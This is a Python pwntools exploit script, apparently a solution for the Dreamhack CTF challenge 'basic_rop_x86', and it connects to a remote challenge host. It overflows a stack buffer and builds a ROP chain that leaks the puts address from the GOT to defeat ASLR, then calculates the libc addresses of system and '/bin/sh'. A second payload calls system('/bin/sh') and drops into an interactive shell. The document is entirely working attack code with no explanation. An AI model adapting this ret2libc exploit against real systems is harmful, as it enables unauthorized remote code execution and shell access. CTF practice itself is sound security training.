from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games",19801)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

pop_ebx = 0x080483d9
puts_plt = e.plt['puts']
puts_got = e.got['puts']

main = e.symbols['main']


payload = b"A"*0x48
payload += p32(puts_plt)
payload += p32(pop_ebx)
payload += p32(puts_got)
payload += p32(main)

p.send(payload)

print(p.recvuntil('A'*0x40))

leak = u32(p.recv(4))
lb = leak - libc.symbols['puts']
system = lb + libc.symbols['system']
binsh = lb + list(libc.search(b"/bin/sh"))[0]

payload2 = b"B"*0x48
payload2 += p32(system)
payload2 += b'B'*0x4
payload2 += p32(binsh)

p.send(payload2)

p.interactive()
